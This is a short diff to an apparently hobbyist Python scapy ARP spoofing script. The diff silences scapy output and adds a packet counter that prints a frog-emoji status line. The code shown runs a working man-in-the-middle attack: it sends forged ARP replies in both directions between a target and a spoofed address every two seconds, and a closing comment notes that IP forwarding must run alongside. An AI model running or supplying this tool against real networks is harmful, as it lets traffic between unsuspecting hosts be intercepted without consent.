@@ -16,14 +16,17 @@ def find_mac(ip):
 def spoof(target_ip, spoof_ip):
         target_mac = find_mac(target_ip)
         packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
-        scapy.send(packet)
+        scapy.send(packet,verbose=False)
 
 
 T = options.target_ip
 S = options.spoofed_ip
+packet_count=0
 while True:
         spoof(T,S)
         spoof(S,T)
+        packet_count = packet_count+1
+        print("[+] 🐸are hopping, Packets sent ->", packet_count*2)
         time.sleep(2)
 
 # Upon running this program there needs a bash command to run in parallel i.e. IP FORWARDING
